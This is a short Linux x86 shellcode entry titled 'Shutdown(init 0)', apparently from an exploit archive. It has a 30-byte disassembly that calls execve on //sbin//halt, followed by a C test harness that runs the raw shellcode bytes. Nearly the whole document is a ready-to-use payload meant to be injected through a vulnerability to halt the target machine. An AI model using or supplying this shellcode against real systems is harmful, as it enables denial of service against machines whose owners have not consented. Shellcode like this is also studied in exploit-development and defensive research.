Linux/x86 - Shutdown(init 0) - 30 bytes

#Greetz : Bomberman(Leader)
#Author : B3mB4m

08048060 <.text>:
8048060:	31 c0                	
8048062:	50                   	
8048063:	68 68 61 6c 74       	push   $0x746c6168
8048068:	68 69 6e 2f 2f       	push   $0x2f2f6e69
804806d:	68 2f 2f 73 62       	push   $0x62732f2f
8048072:	89 e3                	
8048074:	50                   	
8048075:	89 e2                	
8048077:	53                   	
8048078:	89 e1                	
804807a:	b0 0b                	;execve //sbin//halt
804807c:	cd 80                	syscall

#include <stdio.h>
#include <string.h>
 
char *diebich = "\x31\xc0\x50\x68\x68\x61\x6c\x74\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x73\x62\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void){
	fprintf(stdout,"Length: %d\n",strlen(diebich));
	(*(void(*)()) diebich)();}
